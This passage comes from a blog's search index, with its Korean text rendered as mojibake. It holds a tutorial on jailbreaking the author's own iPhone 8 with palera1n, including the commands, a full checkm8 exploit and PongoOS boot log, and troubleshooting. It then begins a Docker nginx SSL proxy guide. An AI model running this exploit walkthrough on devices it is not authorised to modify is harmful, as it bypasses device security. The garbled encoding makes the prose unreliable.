ì´ˆê¸°í™” í–ˆë‹¤ë©´ MacBookì— ì—°ê²°í•˜ë„ë¡ í•˜ì. ì´ ë•Œ USB A to Lightningì„ ì‚¬ìš©í•´ì•¼ í•œë‹¤. iPhoneì„ ì²˜ìŒ ìƒ€ì„ ë•Œ ì£¼ëŠ” ë²ˆë“¤ ì¼€ì´ë¸”(USB C to Lightning Cable)ì„ ì‚¬ìš©í•  ê²½ìš° ê¸°ê¸°ê°€ DFU ëª¨ë“œë¡œ ë„˜ì–´ê°€ì§€ ì•ŠëŠ” ì´ìŠˆê°€ ìˆê¸° ë•Œë¬¸ì´ë‹¤. checkra1në„ ì´ ì´ìŠˆì— ëŒ€í•´ ì–¸ê¸‰í–ˆì—ˆë‹¤.  ì•Œë‹¤ì‹œí”¼ MacBookì— USB A Typeì„ ì—°ê²°í•˜ë ¤ë©´ ë³„ë„ì˜ í—ˆë¸Œê°€ ìˆì–´ì•¼ í•œë‹¤. ë°ì´í„° ì „ì†¡ ê³¼ì •ì—ì„œ ëŠê²¨ì„œ ë²½ëŒì´ ë  ìœ„í—˜ì´ë‚˜ ì´ëŸ°ê±¸ ìƒê°í•´ë³´ë©´ ì •í’ˆ í—ˆë¸Œë¥¼ ì‚¬ìš©í•˜ëŠ” ê²ƒì´ ì•ˆì „í•´ ë³´ì¸ë‹¤. í•˜ì§€ë§Œ MacBook C Type í—ˆë¸ŒëŠ” 7-8ë§Œì› ì •ë„ í•œë‹¤. ì•„ì§ í”„ë¡œì íŠ¸ ì‹œì‘ë„ ëª»í–ˆëŠ”ë° ëˆì´ ê½¤ ê¹¨ì¡Œë‹¤. ì°¸ ë¹„ì‹¼ ì‘ì—…ì´ë‹¤. (ì¼€ì´ë¸” ì‚¬ê³ , í—ˆë¸Œ ì‚¬ê³ , ê¸°ê¸° ì‚¬ê³  ã…ã…â€¦)5. exploitiPhoneì„ MacBookì— ì—°ê²°í–ˆë‹¤ë©´ í„°ë¯¸ë„ì„ ì—´ê³  palera1n ì„ ì‹¤í–‰í•˜ì—¬ exploitì„ ìˆ˜í–‰í•˜ì. ê³¼ì •ì€ ì•„ë˜ì™€ ê°™ë‹¤.  palera1n -v -c -f ë¥¼ í†µí•´ fakefsë¥¼ ìƒì„±  palera1n -v -f ë¥¼ í†µí•´ exploitì„ ìˆ˜í–‰5.1. fakefsë¥¼ ìƒì„±  ìš°ì„  fakefsë¥¼ ìƒì„±í•´ì•¼í•œë‹¤. í„°ë¯¸ë„ì— palera1n -v -c -f ë¥¼ ì ì–´ì£¼ì. - [03/04/23 03:06:19] &lt;Info&gt;: Waiting for devices - [03/04/23 03:06:19] &lt;Verbose&gt;: Normal mode device connected - [03/04/23 03:06:23] &lt;Verbose&gt;: Normal mode device disconnected - [03/04/23 03:06:29] &lt;Verbose&gt;: Recovery mode device 6869920866910254 connected - [03/04/23 03:06:30] &lt;Info&gt;: Press Enter when ready for DFU mode  ê·¸ëŸ¬ë©´ ê¸°ê¸°ë¥¼ ì°¾ì€ ë’¤(í¬íŠ¸ì— ì—°ê²° ë˜ì–´ìˆì–´ì•¼ í•¨) DFU ëª¨ë“œì— ì§„ì…í•  ì¤€ë¹„ê°€ ë˜ë©´ Enterë¥¼ ëˆ„ë¥´ë¼ê³  ë‚˜ì˜¨ë‹¤.  ì—¬ê¸°ê¹Œì§€ ì˜¤ë©´ ì—°ê²°ëœ iPhoneì´ ìë™ìœ¼ë¡œ ì¢…ë£Œëœ ë’¤ì— ìœ„ ê·¸ë¦¼ì²˜ëŸ¼ ë¦¬ì»¤ë²„ë¦¬ ëª¨ë“œì— ì§„ì…í•œë‹¤. ì´ì œ Enterë¥¼ ì³ì£¼ë©´ ë˜ëŠ”ë°, DFUì— ì§„ì…í•˜ê¸° ìœ„í•´ ê¸°ê¸° ë²„íŠ¼ì„ ëˆŒëŸ¬ì¤˜ì•¼ í•˜ë‹ˆ Get ready.. ë¼ëŠ” ë¬¸êµ¬ê°€ ë‚˜ì˜¬ ë•Œ ì¤€ë¹„ë¥¼ í•´ì¤˜ì•¼ í•œë‹¤.Hold volume down + side button (0)Hold volume down button (3)  - [03/04/23 03:06:47] &lt;Verbose&gt;: DFU mode device 6869920866910254 connected - [03/04/23 03:06:47] &lt;Info&gt;: Device entered DFU mode successfully - [03/04/23 03:06:47] &lt;Info&gt;: About to execute checkra1n  ê°œë°œìëŠ” ì¹œì ˆí•˜ê²Œë„ DFU ëª¨ë“œ ì§„ì…ì„ ì¤€ë¹„í•  ì‹œê°„ì„ 3ì´ˆ ì¤€ë‹¤. 3, 2, 1 ì¹´ìš´íŠ¸ì— ë§ì¶° DFU ëª¨ë“œì— ì§„ì…í•˜ë©´ ë˜ëŠ”ë° iPhone 8ì˜ ê²½ìš° [ì „ì› ë²„íŠ¼ + ë³¼ë¥¨ ë‹¤ìš´] &gt; [ë³¼ë¥¨ ë‹¤ìš´] ì„ DFUì— ì§„ì…í•  ë•Œ ê¹Œì§€ ëˆŒëŸ¬ì£¼ë©´ ëœë‹¤. ìì„¸í•œ ë‚´ìš©ì€ í„°ë¯¸ë„ Logì— ì°í˜€ ë‚˜ì˜¨ë‹¤. (í˜¹ì€ DFU ì§„ì… ë°©ë²• ê²€ìƒ‰)      ì´í›„ ìë™ìœ¼ë¡œ Exploitì„ ìœ„í•œ PongoOSë¡œ ì§„ì…í•˜ê²Œ ë˜ê³  ê°€ë§Œíˆ ëƒ…ë‘ë©´ ìœ„ì™€ ê°™ì´ fakefs ìƒì„±ì´ ì§„í–‰ëœë‹¤. 5ë¶„ì •ë„ ì†Œìš”ë˜ë©°, ì™„ë£Œ í›„ ìë™ìœ¼ë¡œ ê¸°ê¸°ê°€ ì¬ë¶€íŒ…ëœë‹¤.        full logëŠ” ì•„ë˜ì™€ ê°™ë‹¤.  # == palera1n-c ==## Made by: Nick Chan, Tom , Mineek, Nebula, llsc12## Thanks to: dora2ios, pythonplayer, tihmstar, nikias# (libimobiledevice), checkra1n team (Siguza, axi0mx, littlelailo# et al.), Procursus Team (Hayden Seay, Cameron Katri, Keto et.al) - [03/04/23 03:06:19] &lt;Info&gt;: Waiting for devices - [03/04/23 03:06:19] &lt;Verbose&gt;: Normal mode device connected - [03/04/23 03:06:19] &lt;Info&gt;: Telling device with udid 876f7ee96ef6832f9cfccfa39db4b0867f219188 to enter recovery mode immediately - [03/04/23 03:06:23] &lt;Verbose&gt;: Normal mode device disconnected - [03/04/23 03:06:29] &lt;Verbose&gt;: Recovery mode device 6869920866910254 connected - [03/04/23 03:06:30] &lt;Info&gt;: Press Enter when ready for DFU modeGet ready (0)Hold volume down + side button (2) - [03/04/23 03:06:38] &lt;Verbose&gt;: Recovery mode device disconnectedHold volume down + side button (0)Hold volume down button (3) - [03/04/23 03:06:47] &lt;Verbose&gt;: DFU mode device 6869920866910254 connected - [03/04/23 03:06:47] &lt;Info&gt;: Device entered DFU mode successfully - [03/04/23 03:06:47] &lt;Info&gt;: About to execute checkra1n## Checkra1n 0.1337.1## Proudly written in nano# (c) 2019-2023 Kim Jong Cracks##========  Made by  =======# argp, axi0mx, danyl931, jaywalker, kirb, littlelailo, nitoTV# never_released, nullpixel, pimskeks, qwertyoruiop, sbingner, siguza#======== Thanks to =======# haifisch, jndok, jonseals, xerub, lilstevie, psychotea, sferrini# Cellebrite (ih8sn0w, cjori, ronyrus et al.)#========================== - [03/04/23 03:06:48] &lt;Verbose&gt;: Starting thread for Apple TV 4K Advanced board - [03/04/23 03:06:48] &lt;Info&gt;: Waiting for DFU mode devices - [03/04/23 03:06:48] &lt;Verbose&gt;: DFU mode device found - [03/04/23 03:06:48] &lt;Info&gt;: Checking if device is ready - [03/04/23 03:06:48] &lt;Verbose&gt;: Attempting to perform checkm8 on 8015 11 - [03/04/23 03:06:48] &lt;Info&gt;: Setting up the exploit - [03/04/23 03:06:48] &lt;Verbose&gt;: == checkm8 setup stage == - [03/04/23 03:06:48] &lt;Verbose&gt;: Entered initial checkm8 state after 1 steps - [03/04/23 03:06:48] &lt;Verbose&gt;: Stalled input endpoint after 1 steps - [03/04/23 03:06:48] &lt;Verbose&gt;: DFU mode device disconnected - [03/04/23 03:06:48] &lt;Verbose&gt;: DFU mode device found - [03/04/23 03:06:48] &lt;Verbose&gt;: == checkm8 trigger stage == - [03/04/23 03:06:51] &lt;Info&gt;: Checkmate! - [03/04/23 03:06:51] &lt;Verbose&gt;: Device should now reconnect in download mode - [03/04/23 03:06:51] &lt;Verbose&gt;: DFU mode device disconnected - [03/04/23 03:06:57] &lt;Info&gt;: Entered download mode - [03/04/23 03:06:57] &lt;Verbose&gt;: Download mode device found - [03/04/23 03:06:57] &lt;Info&gt;: Booting PongoOS... - [03/04/23 03:06:59] &lt;Info&gt;: Found PongoOS USB Device - [03/04/23 03:06:59] &lt;Verbose&gt;: Executing PongoOS command: 'fuse lock' - [03/04/23 03:06:59] &lt;Verbose&gt;: Executing PongoOS command: 'sep auto' - [03/04/23 03:06:59] &lt;Verbose&gt;: Uploaded 115504 bytes to PongoOS - [03/04/23 03:06:59] &lt;Verbose&gt;: Executing PongoOS command: 'modload' - [03/04/23 03:06:59] &lt;Verbose&gt;: Executing PongoOS command: 'kpf_flags 0x1' - [03/04/23 03:06:59] &lt;Verbose&gt;: Executing PongoOS command: 'checkra1n_flags 0x0' - [03/04/23 03:06:59] &lt;Verbose&gt;: Executing PongoOS command: 'palera1n_flags 0x5' - [03/04/23 03:06:59] &lt;Verbose&gt;: Executing PongoOS command: 'rootfs' - [03/04/23 03:06:59] &lt;Verbose&gt;: Uploaded 524288 bytes to PongoOS - [03/04/23 03:06:59] &lt;Verbose&gt;: Executing PongoOS command: 'ramdisk' - [03/04/23 03:06:59] &lt;Verbose&gt;: Uploaded 5821922 bytes to PongoOS - [03/04/23 03:06:59] &lt;Verbose&gt;: Executing PongoOS command: 'overlay' - [03/04/23 03:06:59] &lt;Verbose&gt;: Executing PongoOS command: 'xargs  wdt=-1 rootdev=md0' - [03/04/23 03:06:59] &lt;Verbose&gt;: Executing PongoOS command: 'bootx' - [03/04/23 03:06:59] &lt;Info&gt;: Booting Kernel...5.2. íƒˆì˜¥ì„ ì§„í–‰  ì—¬ê¸°ê¹Œì§€ ì˜ ë”°ë¼ì™”ìœ¼ë©´ iPhoneì´ ë³„ ë‹¤ë¥¸ ë¬¸ì œ ì—†ì´ ë°”íƒ•í™”ë©´ì„ ë³´ì—¬ì£¼ê³  ìˆì„ ê²ƒì´ë‹¤.  ì´ë²ˆì—” í„°ë¯¸ë„ì— palera1n -v -f ë¥¼ ì ì–´ì£¼ì. ì•„ê¹Œì™€ ë‹¤ë¥¸ì ì€ fakefsë¥¼ ìƒì„±í•´ì£¼ëŠ” ì˜µì…˜ì¸ -c ê°€ ë¹ ì¡Œë‹¤.  ë¦¬ì»¤ë²„ë¦¬ ì§„ì…, DFU ì§„ì… ë“± ê³¼ì •ì€ 5.1. ê³¼ ë™ì¼í•˜ê²Œ ì§„í–‰í•˜ë©´ ëœë‹¤.6. ê¸°ê¸°ì—ì„œ palera1n ì•± ì‹¤í–‰ ë° ì„¤ì¹˜ ì‘ì—…  ì •ìƒì ìœ¼ë¡œ ì„¤ì¹˜ ë˜ì—ˆë‹¤ë©´ í™ˆ í™”ë©´ì— ìœ„ì™€ ê°™ì´ â€œpalera1nâ€ ì• í”Œë¦¬ì¼€ì´ì…˜ì´ ì„¤ì¹˜ ë˜ì–´ìˆì„ ê²ƒì´ë‹¤.  â€œpalera1nâ€ ì„ ì‹¤í–‰í•˜ê³  â€œinstallâ€  â€œRespringâ€ ì„ í´ë¦­í•˜ì—¬ íƒˆì˜¥ì„ ë§ˆë¬´ë¦¬7. ì¶•í•˜í•©ë‹ˆë‹¤! íƒˆì˜¥ ì„±ê³µ~!!  íƒˆì˜¥ì´ ì •ìƒì ìœ¼ë¡œ ì™„ë£Œë˜ì—ˆë‹¤.  í™ˆ í™”ë©´ì— ìƒì„±ëœ â€œSileoâ€ ì• í”Œë¦¬ì¼€ì´ì…˜ì„ í†µí•´ ë‹¤ì–‘í•œ Tweakì„ ì„¤ì¹˜í•´ë³¼ ìˆ˜ ìˆë‹¤.8. ì£¼ì˜í•  ì  í•œê°€ì§€  ì•ì„œ A11 ì¹©ì…‹ ì´í›„ ëª¨ë¸ì€ TouchIDë‚˜ passcodeê°€ í•œë²ˆì´ë¼ë„ ì„¤ì • ë˜ì—ˆë‹¤ë©´ ì•ˆëœë‹¤ê³  ì–¸ê¸‰í–ˆì—ˆë‹¤.  ì´ëŠ” íƒˆì˜¥ ì´í›„ì—ë„ ë§ˆì°¬ê°€ì§€ë‹¤. ì•”í˜¸ì„¤ì • ì ˆëŒ€ì ˆëŒ€ ê¸ˆì§€ì´ë‹¤Trouble Shooting1. DFU ì§„ì…ì´ ì•ˆëœë‹¤.  ì´ëŠ” ì•ì„œ ì–¸ê¸‰í•œ ì¼€ì´ë¸” ë¬¸ì œì¼ ê°€ëŠ¥ì„±ì´ í¬ë©° C to Lightning ì¦‰, ê¸°ê¸° êµ¬ë§¤ì‹œ ë²ˆë“¤ë¡œ ì˜¤ëŠ” ì¼€ì´ë¸”ì„ ì´ìš©í–ˆì„ ë•Œ DFUì— ì§„ì…í•˜ì§€ ëª»í•  ìˆ˜ ìˆë‹¤. ì´ëŠ” í•´ë‹¹ ë ˆí¬ì§€í† ë¦¬ README ì—ì„œë„ ì–¸ê¸‰í•œ ë°” ìˆë‹¤.          The BootROM will only enter DFU if it detects USB voltage, which boils down to checking whether a certain pin is asserted from the Tristar chip. The Tristar does this based on the cableâ€™s accessory ID, and apparently USB-A and USB-C cables have different accessory IDs, and the one of the USB-C cables makes the Tristar not assert the USB voltage pin.      2. PongoOS ì§„ì… í›„ íŠ¹ì • ë¡œê·¸ë§Œ ê³„ì† ëœ¨ê³  ì¬ë¶€íŒ…ì´ ì•ˆëœë‹¤.  ìœ„ì™€ ê°™ì€ ë¬¸êµ¬ê°€ ê³„ì† ëœ¨ë©´ì„œ ì¬ë¶€íŒ…ì´ ì•ˆëœë‹¤ë©´ ë‹¤ìŒê³¼ ê°™ì€ ë‘ê°œì˜ ë¬¸ì œë¥¼ ì˜ì‹¬í•´ë³¼ ìˆ˜ ìˆë‹¤.  ì²«ì§¸, ì‚¬ìš©í•˜ê³  ìˆëŠ” ì¼€ì´ë¸”ì´ ë¬¸ì œ ì¼ ìˆ˜ ìˆë‹¤. ì‹¤ì œë¡œ ì •í’ˆ ì¼€ì´ë¸”ë¡œ ë°”ê¾¸ì ê·€ì‹ ê°™ì´ í•´ê²°ë˜ì—ˆë‹¤.  ë‘˜ì§¸, fakefs ìƒì„± ê³¼ì •ì—ì„œ ë¬¸ì œê°€ ìˆì„ ìˆ˜ ìˆë‹¤. ë‚˜ì˜ ê²½ìš° create fakefs í•  ë•Œ ëª¨ì¢…ì˜ ì´ìœ ë¡œ -c ì˜µì…˜ì´ ì•„ë‹Œ, -B ì˜µì…˜ì„ ì‚¬ìš© í–ˆì—ˆëŠ”ë°(bindfs) ì´ëŠ” iOS 16ì—ì„œëŠ” ë”ì´ìƒ ì œëŒ€ë¡œ ë™ì‘í•˜ì§€ ì•ŠëŠ” ê¸°ëŠ¥ì´ê¸° ë•Œë¬¸ì— ë²½ëŒì´ ëì—ˆë‹¤.3. ì´ì™¸ì˜ ë¬¸ì œë“¤..  READMEì—ì„œ í™•ì¸í•´ë³¼ ìˆ˜ ìˆëŠ” â€œíƒˆì˜¥ì´ ì‹¤íŒ¨í•  ìˆ˜ ìˆëŠ” ì¼€ì´ìŠ¤â€ ë“¤ì„ ì‚´í´ë³´ë©´          AMD CPUì—ì„œëŠ” USB ì»¨íŠ¸ë¡¤ëŸ¬ ë¬¸ì œ(ì•„ë§ˆë„) ë•Œë¬¸ì— ìµìŠ¤ì— ì‹¤íŒ¨í•  ìˆ˜ ìˆìœ¼ë‹ˆ INTELì´ë‚˜ MACOSì—ì„œ ì‹œë„í•´ë¼      í•´ë‹¹ ìµìŠ¤ëŠ” A8 ì—ì„œ A11Â ì¹©ì…‹ê¹Œì§€ ê°€ëŠ¥í•¨      (ì•ì„œ ê¸°ìˆ í•œ) USB C íƒ€ì… ì¼€ì´ë¸” ì‚¬ìš©      4. íƒˆì˜¥ì— ì‹¤íŒ¨í•œë‹¤ë©´?  íƒˆì˜¥ì— ì‹¤íŒ¨í•˜ë©´ palera1n --force-revert -f ë¥¼ ì‹¤í–‰í•˜ì—¬ fakefs ì œê±°í•œ ë’¤ ë‹¤ì‹œ ì‹œë„  DFU ë“±ì—ì„œ í•¸ë“œí°ì´ ë©ˆì¶”ë©´ ê°•ì œ ì¬ë¶€íŒ…(ë³¼ë¥¨ ì—… &gt; ë³¼ë¥¨ ë‹¤ìš´ &gt; ì „ì› ê¸¸ê²Œ ëˆ„ë¥´ê¸°) í•´ë³´ê¸°Reference  ì°¸ê³  ë§í¬  palera1n"
  },
  
  {
    "title": "[Docker] Nginxë¥¼ ì´ìš©í•´ì„œ SSL ì„¤ì •í•˜ê¸°(HTTPS)",
    "url": "/posts/docker-nginx-proxy-ssl/",
    "categories": "DOCKER",
    "tags": "docker, nginx, proxy, https, ssl",
    "date": "2023-02-01 00:56:01 +0900",
    





    
    "snippet": "Why?  ìµœê·¼ì— ë¸Œë¼ìš°ì €ì™€ ë‚´ ì„œë²„ ê°„ì˜ HTTP í†µì‹ ì„ ë‹¤ë¤„ì•¼ í•˜ëŠ” ì¼ì´ ìˆì—ˆë‹¤. ì´ ë•Œ ë¸Œë¼ìš°ì €ë¡œ ì ‘ì†í•œ ì„œë²„ëŠ” HTTPS, ë‚´ê°€ êµ¬í˜„í•œ ì„œë²„ëŠ” HTTP ì˜€ê¸° ë•Œë¬¸ì— ë‹¹ì—°í•˜ê²Œë„ Mixed Contents ë¬¸ì œê°€ ë°œìƒí–ˆë‹¤. ë¬¸ì œë¥¼ í•´ê²°í•˜ê¸° ìœ„í•´ ë‚´ ì„œë²„ì— SSL ì¸ì¦ì„ ë„£ì–´ì£¼ê¸°ë¡œ í–ˆë‹¤. ì„œë²„ì— SSL ì¸ì¦ì„ ë°›ëŠ” ë°©ë²•ì—ëŠ” ì—¬ëŸ¬ê°€ì§€ê°€ ìˆì§€ë§Œ, ë§¤ë²ˆ ...",
    "content": "Why?  ìµœê·¼ì— ë¸Œë¼ìš°ì €ì™€ ë‚´ ì„œë²„ ê°„ì˜ HTTP í†µì‹ ì„ ë‹¤ë¤„ì•¼ í•˜ëŠ” ì¼ì´ ìˆì—ˆë‹¤. ì´ ë•Œ ë¸Œë¼ìš°ì €ë¡œ ì ‘ì†í•œ ì„œë²„ëŠ” HTTPS, ë‚´ê°€ êµ¬í˜„í•œ ì„œë²„ëŠ” HTTP ì˜€ê¸° ë•Œë¬¸ì— ë‹¹ì—°í•˜ê²Œë„ Mixed Contents ë¬¸ì œê°€ ë°œìƒí–ˆë‹¤. ë¬¸ì œë¥¼ í•´ê²°í•˜ê¸° ìœ„í•´ ë‚´ ì„œë²„ì— SSL ì¸ì¦ì„ ë„£ì–´ì£¼ê¸°ë¡œ í–ˆë‹¤. ì„œë²„ì— SSL ì¸ì¦ì„ ë°›ëŠ” ë°©ë²•ì—ëŠ” ì—¬ëŸ¬ê°€ì§€ê°€ ìˆì§€ë§Œ, ë§¤ë²ˆ í”„ë ˆì„ì›Œí¬ ë³„ HTTPS ì ìš© ë°©ë²•ì„ ê²€ìƒ‰í•˜ëŠ” ê²ƒì´ ì§€ì³¤ê¸° ë•Œë¬¸ì— í•­ìƒ ëˆˆë…ë“¤ì—¬ ì™”ë˜ â€œnginx reverse proxyë¡œ ssl ì¸ì¦ ì ìš©í•˜ê¸°(ë¬´ë ¤ dockerë¡œ!)â€ ë¥¼ ì‹œë„í•´ë³´ë ¤ê³  í•œë‹¤.  +) ê¸ˆë°© êµ¬í˜„í•  ìˆ˜ ìˆì„ ì¤„ ì•Œì•˜ëŠ”ë° ìƒê°ë³´ë‹¤ ë§ì€ ì‹œê°„ì´ ê±¸ë ¸ë‹¤. ê´€ë ¨ ê¸€ë“¤ì€ ë§ìœ¼ë‚˜ ì–´ë”˜ê°€ ë‚œì¡í–ˆê³ , ì—¬ê¸°ì €ê¸°ì„œ config ë‚´ìš©ì„ ë³µë¶™í•˜ë‹¤ë³´ë‹ˆ ì„¤ì •ì´ ê¼¬ì—¬ì„œ ì‚½ì§ˆì„ ì¡°ê¸ˆ í–ˆë‹¤.. ì´ ê¸€ì„ í†µí•´ â€œdocker + nginx + reverse proxy + sslâ€ ì´ í•„ìš”í•œ ì‚¬ëŒë“¤ì—ê²Œ ë¬¸ì œë¥¼ í•´ê²°í•˜ëŠ” íŒíŠ¸ê°€ ë˜ì—ˆìœ¼ë©´ í•˜ëŠ” ë°”ë¨ì´ë‹¤.Proxy Server?proxy serverëŠ” í´ë¼ì´ì–¸íŠ¸ì™€ ì ‘ì†í•˜ê³ ì í•˜ëŠ” ì„œë²„ ì‚¬ì´ì— ì¤‘ê³„(proxy) ì—­í• ì„ ìˆ˜í–‰í•˜ëŠ” ê²ƒì„ ë§í•œë‹¤. ê°„ë‹¨í•˜ê²Œ ë§í•˜ìë©´ í´ë¼ì´ì–¸íŠ¸ì™€ ì„œë²„ í†µì‹  ì‚¬ì´ì— ì§•ê²€ë‹¤ë¦¬ê°€ í•˜ë‚˜ ìƒê¸´ ê²ƒì´ë‹¤. ì¼ë°˜ì ìœ¼ë¡œ Proxyì—ëŠ” Forward Proxyì™€ Reverse Proxyê°€ ì¡´ì¬í•œë‹¤.Forward Proxyí´ë¼ì´ì–¸íŠ¸ê°€ proxy server ì— ì™¸ë¶€ ìì‚°ì— ì ‘ê·¼ì„ ìš”ì²­í•˜ë©´ proxy server ê°€ í´ë¼ì´ì–¸íŠ¸ë¥¼ ëŒ€ì‹ í•˜ì—¬ ì¸í„°ë„·ì— ì ‘ì†í•œ í›„ ê²°ê³¼ë¥¼ ì „ë‹¬í•´ì¤€ë‹¤. ì›¹ ì‚¬ì´íŠ¸ ì·¨ì•½ì  ì ê²€ì‹œ ì´ìš©í•˜ëŠ” Burp Suite ë‚˜ Paros ë“±ì˜ ë„êµ¬ê°€ ì´ì— í•´ë‹¹í•œë‹¤.Reverse ProxyForward Proxy ì—ì„œ proxy serverê°€ í´ë¼ì´ì–¸íŠ¸ì˜ ì—­í• ì„ ëŒ€ì‹  í•˜ì˜€ë‹¤ë©´, Reverse Proxy ì—ì„œëŠ” ì„œë²„ì˜ ì—­í• ì„ ëŒ€ì‹ í•˜ëŠ” ê²ƒì´ë¼ê³  í•  ìˆ˜ ìˆë‹¤. í´ë¼ì´ì–¸íŠ¸&lt;-&gt;í”„ë¡ì‹œì„œë²„&lt;-&gt;ë‚´ë¶€ì„œë²„ ì™€ ê°™ì€ êµ¬ì¡°ë¡œ ë˜ì–´ìˆì„ ë•Œ í´ë¼ì´ì–¸íŠ¸ê°€ proxy serverì— ì ‘ê·¼ì„ ìš”ì²­í•˜ë©´ proxy server ê°€ ë‹¤ì‹œ ë‚´ë¶€ ì„œë²„ì— ë°ì´í„°ë¥¼ ìš”ì²­í•˜ì—¬ í´ë¼ì´ì–¸íŠ¸ì—ê²Œ ê²°ê³¼ë¥¼ ì „ë‹¬í•´ì¤€ë‹¤.ì´ë ‡ê²Œ ë˜ë©´ ì‚¬ìš©ìëŠ” ë‚´ë¶€ ì„œë²„ì— ì§ì ‘ ì ‘ê·¼í•  ìˆ˜ ì—†ê¸° ë•Œë¬¸ì— ì„œë²„ë¥¼ ë” ì•ˆì „í•˜ê²Œ ìš´ì˜í•  ìˆ˜ ìˆë‹¤. ë˜í•œ, ì‚¬ìš©ìê°€ êµ³ì´ ë‚´ë¶€ ì„œë²„ì˜ ì•„ì´í”¼ë¥¼ ëª°ë¼ë„ ë˜ë©°, ì—¬ëŸ¬ ì œí’ˆì„ ê°ê¸° ë‹¤ë¥¸ ì„œë²„ì—ì„œ ìš´ì˜í•˜ê³  ìˆì„ ë•Œ ì™¸ë¶€ë¡œ ë…¸ì¶œì‹œí‚¤ëŠ” í¬íŠ¸ë¥¼ í•˜ë‚˜ë§Œ ì‚¬ìš©í•˜ë”ë¼ë„ reverse proxyê°€ ì‚¬ìš©ìì˜ ìš”ì²­ì— ë”°ë¼ ë§ˆì¹˜ ë¼ìš°íŒ… í•˜ë“¯ì´ ì‚¬ìš©í•  ìˆ˜ ìˆì–´ íš¨ê³¼ì ì¸ í† í´ë¡œì§€ë¥¼ êµ¬ì„±í•  ìˆ˜ ìˆë‹¤.ëª©í‘œ  ë‚´ ê²½ìš° í˜„ì¬ ê°œë°œì¤‘ì¸ Flask ì„œë²„ ì•ë‹¨ì— Reverse Proxyë¥¼ ë¶™ì—¬ì„œ í•´ë‹¹ ë„ë©”ì¸ì„ ì ‘ì†í–ˆì„ ë•Œ HTTPSê°€ ì ìš©ë˜ë„ë¡ í•  ê²ƒì´ë‹¤.  ê°œë°œì¤‘ì¸ ì• í”Œë¦¬ì¼€ì´ì…˜ì´ ê¼­ Flaskê°€ ì•„ë‹ˆì—¬ë„ ê°€ëŠ¥í•˜ë‹ˆ ì°¸ê³ Nginx Dockerë¥¼ ì´ìš©í•´ì„œ SSL ì„¤ì •í•˜ê¸°  í™˜ê²½ : Ubuntu 22.04 LTS  docker, docker-composeê°€ ì„¤ì¹˜ ë˜ì–´ìˆë‹¤ê³  ê°€ì •  ì°¸ê³ í•œ ë§í¬  ê³„íš          ë³¸ì¸ì˜ ìƒí™©ì— ë§ê²Œ docker-compose.yml íŒŒì¼ì„ ì‘ì„±í•œë‹¤.      nginx.conf íŒŒì¼ì„ ì‘ì„±í•œë‹¤.      certbotìœ¼ë¡œ nginxë¥¼ ìë™ìœ¼ë¡œ ssl ì¸ì¦í•´ì£¼ëŠ” ìŠ¤í¬ë¦½íŠ¸ë¥¼ ëŒë¦°ë‹¤.      0. ë””ë ‰í† ë¦¬ ë§Œë“¤ê¸°ìš°ì„  ì‘ì—…í•  ë””ë ‰í† ë¦¬ë¥¼ í•˜ë‚˜ íŒŒë„ë¡ í•˜ì. ìš°ì„ ì€ ì´ëŸ°ì‹ìœ¼ë¡œ êµ¬ì¡°ê°€ ëœë‹¤ëŠ” ê²ƒë§Œ ì¸ì§€í•˜ë„ë¡ í•˜ì..â”œâ”€â”€ app # ì´ê±´ ë‚´ Flask ì„œë²„ì´ë‹¤. ìƒí™©ì— ë§ê²Œ ë³¸ì¸ì˜ ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ìœ„ì¹˜ì‹œí‚¤ìâ”‚   â”œâ”€â”€ Dockerfileâ”‚   â””â”€â”€ srcâ”‚       â””â”€â”€ app.pyâ”œâ”€â”€ data # data ë””ë ‰í† ë¦¬ë¥¼ ë§Œë“¤ê³  â”‚   â””â”€â”€ nginx.conf # ì•ˆì— nginx.conf íŒŒì¼ì„ ë§Œë“¤ì–´ì£¼ìâ”œâ”€â”€ docker-compose.yml # ë°”ë¡œ ë’¤ì— ì‘ì„±í•  docker-compose.yml íŒŒì¼ì´ë‹¤.â””â”€â”€ init-letsencrypt.sh # ì´ê±´ ì§€ê¸ˆ ì‹ ê²½ì“°ì§€ ë§ê³  ë’¤ì— ìŠ¤í¬ë¦½íŠ¸ ë‚˜ì˜¤ëŠ”ê±° ë³µë¶™í•˜ë©´ ëœë‹¤.1. docker-compose.yml ì‘ì„±í•˜ê¸°version: '3'services:  your-application:    # ì´ ë¶€ë¶„ì— ë³¸ì¸ì˜ ì• í”Œë¦¬ì¼€ì´ì…˜ configë¥¼ ë„£ë„ë¡ í•˜ì.  nginx:    image: nginx:1.18-alpine    ports:      - \"80:80\"      - \"443:443\"    volumes:      - ./data/nginx.conf:/etc/nginx/nginx.conf      - ./data/nginx:/etc/nginx/conf.d      - ./data/certbot/conf:/etc/letsencrypt      - ./data/certbot/www:/var/www/certbot    command: \"/bin/sh -c 'while :; do sleep 6h &amp; wait $${!}; nginx -s reload; done &amp; nginx -g \\\"daemon off;\\\"'\"    depends_on:      - your-application  certbot:    image: certbot/certbot    volumes:      - ./data/certbot/conf:/etc/letsencrypt      - ./data/certbot/www:/var/www/certbot    entrypoint: \"/bin/sh -c 'trap exit TERM; while :; do certbot renew; sleep 12h &amp; wait $${!}; done;'\"ì‘ì„±í•´ì•¼ í•˜ëŠ” docker-compose íŒŒì¼ì€ ìœ„ì™€ ê°™ë‹¤. ë‹¤ë¥¸ê±´ ê±´ë“¤ì§€ ë§ê³  your-application ì´ë¼ê³  í•´ë†“ì€ ë¶€ë¶„ë§Œ ë³¸ì¸ì˜ ìƒí™©ì— ë§ê²Œ ìˆ˜ì •í•˜ë©´ ëœë‹¤. ê°„ë‹¨í•˜ê²Œ ì„¤ëª…í•˜ìë©´  nginx          image : nginx ê¸°ë³¸ ì´ë¯¸ì§€ë¥¼ ì‚¬ìš©í•  ê²ƒì´ë‹¤.      ports : HTTP(80)ì™€ HTTPS(443)ë¥¼ ì—´ì–´ë†“ì„ ê²ƒì´ë‹¤. ì¶”í›„ 80ìœ¼ë¡œ ë“¤ì–´ì˜¤ëŠ”ê±´ HTTPSë¡œ Redirect í•˜ëŠ” ì„¤ì •ì„ í•  ê²ƒì´ë‹¤.      volumes : nginxì— ssl ì¸ì¦ì„ í• ê²ƒì¸ë°, ê¸°ë³¸ì ìœ¼ë¡œ hostì—ì„œ ssl ì¸ì¦ì„ í•˜ê³  ê·¸ íŒŒì¼ì„ docker container ë‚´ë¶€ë¡œ volume share í•´ ì¤„ ê²ƒì´ë‹¤.      command : ì¸ì¦ì„œ ê°±ì‹ ìš©        certbot          image : letsencryptì—ì„œ ì¹œì ˆí•˜ê²Œë„ ì¸ì¦ ì»¨í…Œì´ë„ˆë¥¼ push 